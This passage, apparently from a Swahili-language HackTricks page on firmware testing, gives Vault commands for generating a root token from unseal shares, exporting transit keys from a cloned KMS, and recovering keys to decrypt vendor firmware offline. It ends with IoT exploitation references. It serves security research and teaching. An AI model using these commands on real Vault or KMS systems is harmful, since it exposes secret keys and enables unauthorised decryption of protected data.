vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Ukiwa na root kwenye KMS iliyoklonwa:

- Fanya funguo za transit ziweze kuhamishwa nje ya mfumo ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Hamisha ufunguo wa unwrap: `vault read transit/export/encryption-key/<name>`
- Jaribu ufunguo wa RSA uliopatikana kwa jozi halisi ya padding/hash iliyotumiwa na KMS. Kushindwa kwa usimbuaji wa PKCS#1 v1.5 na kushindwa kwa usimbuaji chaguo-msingi wa OAEP **hakuthibitishi** kuwa ufunguo huo si sahihi; mifumo mingi inayotegemea Vault hutumia OAEP yenye SHA-256, huku maktaba za kawaida zikitumia SHA-1 kwa chaguo-msingi.
- Ikiwa payload inaanza na `Salted__`, tekeleza KDF ya OpenSSL ya vendor kwa usahihi (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu usimbuaji wa AES-CBC.

Hii hubadilisha "firmware iliyosimbwa" kuwa tatizo la jumla zaidi: **rejesha funguo za uendeshaji zilizo upande wa appliance, kisha tekeleza tena vigezo halisi vya unwrap + KDF offline**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Marejeo

- [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
